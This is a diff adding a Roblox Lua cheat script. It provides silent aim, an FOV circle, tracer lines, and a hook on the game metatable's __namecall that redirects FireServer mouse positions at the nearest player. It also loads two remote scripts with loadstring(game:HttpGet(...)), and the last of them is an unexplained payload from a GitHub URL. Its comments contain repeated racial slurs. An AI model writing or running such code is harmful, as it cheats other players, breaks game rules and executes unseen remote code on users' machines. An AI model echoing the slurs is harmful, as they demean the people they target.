@@ -1,0 +1,254 @@
+local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
+local Notify = AkaliNotif.Notify
+
+-- notification pussy
+local function showNotification()
+    Notify({
+        Title = "Credit by",
+        Description = "Dukeshadow",
+        Duration = 15
+    })
+end
+
+-- type shhhhhhh hahanjggrr
+getgenv().HitPart = "HumanoidRootPart"
+getgenv().Prediction = 0.165241
+getgenv().Enabled = true
+
+-- FOV settings
+getgenv().ShowFOV = true
+getgenv().Filled = false
+getgenv().FOVSize = 150
+getgenv().FOVTransparency = 0.2
+getgenv().FOVThickness = 2.0
+getgenv().FOVColor = Color3.new(1, 0, 0)
+
+-- fov circle
+local SilentAimFOVCircle = Drawing.new("Circle")
+SilentAimFOVCircle.Color = getgenv().FOVColor
+SilentAimFOVCircle.Visible = getgenv().ShowFOV
+SilentAimFOVCircle.Filled = getgenv().Filled
+SilentAimFOVCircle.Radius = getgenv().FOVSize
+SilentAimFOVCircle.Transparency = getgenv().FOVTransparency
+SilentAimFOVCircle.Thickness = getgenv().FOVThickness
+
+-- line type shit
+local Line = Drawing.new("Line")
+Line.Visible = false
+Line.Color = Color3.new(1, 0, 0)
+Line.Thickness = 2
+
+-- esp from highlight idk
+local HighlightBox = Drawing.new("Square")
+HighlightBox.Visible = false
+HighlightBox.Color = Color3.new(1, 0, 0)  -- Red color for highlight
+HighlightBox.Transparency = 0.08  -- Lower transparency for highlight
+HighlightBox.Thickness = 2
+
+-- Microsoft at ur service
+local Players = game:GetService("Players")
+local Camera = workspace.CurrentCamera
+
+-- Set NIGGER. 
+SilentAimFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+
+-- type shhh
+local function getClosestPlayerToCenter()
+    local centerScreenPosition = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+    local closestPlayer
+    local closestDistance = math.huge
+    local localPlayer = game.Players.LocalPlayer
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local playerRootPart = player.Character.HumanoidRootPart
+            local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(playerRootPart.Position)
+
+            if onScreen then
+                local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude
+
+                if distance < closestDistance and distance <= SilentAimFOVCircle.Radius then
+                    closestPlayer = player
+                    closestDistance = distance
+                end
+            end
+        end
+    end
+
+    return closestPlayer
+end
+
+local SilentTarget = nil
+
+-- stfu nigger
+game:GetService("RunService").RenderStepped:Connect(function()
+    SilentTarget = getClosestPlayerToCenter()
+
+    -- Update FOV so u can put ur bitches
+    SilentAimFOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+
+    -- line stigmas 
+    if SilentTarget and SilentTarget.Character and SilentTarget.Character:FindFirstChild("HumanoidRootPart") then
+        local playerRootPart = SilentTarget.Character.HumanoidRootPart
+        local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(playerRootPart.Position)
+
+        if onScreen then
+            Line.Visible = true
+            Line.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2 - (game:GetService("GuiService"):GetGuiInset().Y / 2))
+            Line.To = Vector2.new(screenPosition.X, screenPosition.Y)
+
+            -- highlight u faking nigger stop stalking
+            local boxSize = Vector2.new(50, 50)  -- adjust as much as u want cus u sigma
+            HighlightBox.Size = boxSize
+            HighlightBox.Position = Vector2.new(screenPosition.X - boxSize.X / 2, screenPosition.Y - boxSize.Y / 2)
+            HighlightBox.Visible = true
+        else
+            Line.Visible = false
+            HighlightBox.Visible = false
+        end
+    else
+        Line.Visible = false
+        HighlightBox.Visible = false
+    end
+end)
+
+-- Why DID U REDDEEM ITT
+local mt = getrawmetatable(game)
+local old = mt.__namecall
+setreadonly(mt, false)
+mt.__namecall = newcclosure(function(...)
+    local args = {...}
+    if getgenv().Enabled and SilentTarget ~= nil and SilentTarget.Character and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
+        args[3] = SilentTarget.Character[getgenv().HitPart].Position + (SilentTarget.Character[getgenv().HitPart].Velocity * getgenv().Prediction)
+        return old(unpack(args))
+    end
+    return old(...)
+end)
+
+-- nuggets 
+showNotification()
+
+-- silent aim red
+getgenv().Settings = {
+	["Silent"] = {
+		["Enabled"] = true,
+		["AimPart"] = "HumanoidRootPart",
+		["WallCheck"] = true,
+		["Visualize"] = true,
+		["Prediction"] = {
+		   ["Horizontal"] = 0.15,
+		   ["Vertical"] = 0.05,
+		},
+	    ["AutoPrediction"] = {
+	        ["Enabled"] = true,
+	        ["Type"] = "Normal", --//Normal, Custom
+           ["ping20_30"] = 0.12588,
+           ["ping30_40"] = 0.11911,
+           ["ping40_50"] = 0.12471,
+           ["ping50_60"] = 0.13766,
+           ["ping60_70"] = 0.13731,
+           ["ping70_80"] = 0.13951,
+           ["ping80_90"] = 0.14181,
+           ["ping90_100"] = 0.148,
+           ["ping100_110"] = 0.156,
+           ["ping110_120"] = 0.1567,
+           ["ping120_130"] = 0.1601,
+           ["ping130_140"] = 0.1637,
+           ["ping140_150"] = 0.173,
+           ["ping150_160"] = 0.1714,
+           ["ping160_170"] = 0.1863,
+           ["ping170_180"] = 0.1872,
+           ["ping180_190"] = 0.1848,
+           ["ping190_200"] = 0.1865,
+	    },
+		["Mode"] = "Namecall", --index,namecal
+	},
+	["FOV"] = {
+		["Enabled"] = true,
+		["Size"] = 50,
+		["Filled"] = false,
+		["Thickness"] = 4,
+		["Transparency"] = 1,
+		["Color"] = Color3.fromRGB(255, 0, 0),
+	},
+	["Camlock"] = {
+	    ["Enabled"] = false,
+	    ["AimPart"] = "HumanoidRootPart",
+	    ["Prediction"] = {
+	       ["Horizontal"] = 0.185,
+	       ["Vertical"] = 0.1,
+	    },
+	    ["Smoothness"] = 0.1,
+	    ["AutoPrediction"] = {
+	        ["Enabled"] = false,
+	        ["Type"] = "Normal", --//Normal, Custom
+           ["ping20_30"] = 0.12588,
+           ["ping30_40"] = 0.11911,
+           ["ping40_50"] = 0.12471,
+           ["ping50_60"] = 0.12766,
+           ["ping60_70"] = 0.12731,
+           ["ping70_80"] = 0.12951,
+           ["ping80_90"] = 0.13181,
+           ["ping90_100"] = 0.138,
+           ["ping100_110"] = 0.146,
+           ["ping110_120"] = 0.1367,
+           ["ping120_130"] = 0.1401,
+           ["ping130_140"] = 0.1437,
+           ["ping140_150"] = 0.153,
+           ["ping150_160"] = 0.1514,
+           ["ping160_170"] = 0.1663,
+           ["ping170_180"] = 0.1672,
+           ["ping180_190"] = 0.1848,
+           ["ping190_200"] = 0.1865,
+	    },
+	    ["Shake"] = {
+	        ["X"] = 10,
+	        ["Y"] = 0,
+	        ["Z"] = 0, --dont touch
+	    },
+	},
+	["Misc"] = {
+	    ["NoDelay"] = true,
+	    ["AutoReload"] = false,
+	    ["AutoAir"] = {
+	        ["Enabled"] = true,
+	        ["Interval"] = 0.5,
+	    },
+	    ["CMDS"] = { 
+	        ["Enabled"] = false,
+	        ["FOVPrefix"] = "B",
+	        ["Prediction"] = "A",
+	   },
+	},
+	["Resolution"] = {
+	    ["Value"] = 1,
+	   },
+	["Resolvers"] = {  --entirely not
+	    ["Enabled"] = false,
+	    ["AutoDetect"] = false,
+	    ["Type"] = "Recalculator",
+	},
+    ["Visuals"] = {
+        ["Ambient"] = {
+            ["Enabled"] = false,
+            ["Color"] = Color3.fromRGB(4, 0, 255),
+        },
+        ["OutDoor Ambient"] = {
+            ["Enabled"] = false,
+            ["Color"] = Color3.fromRGB(4, 0, 255)
+        },
+        ["Fog Modifications"] = {
+            ["Enabled"] = false,
+            ["Color"] = Color3.fromRGB(4, 0, 255),
+            ["Start"] = 15,
+            ["End"] = 100 
+        },
+        ["ColorCorrection"] = {
+            ["Enabled"] = false,
+            ["Brightness"] = 0,
+            ["Saturation"] = 5,
+            ["Contrast"] = 2,
+        },
+    },
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bobbbb-b/B/main/77_SJQ0ZC.lua"))()
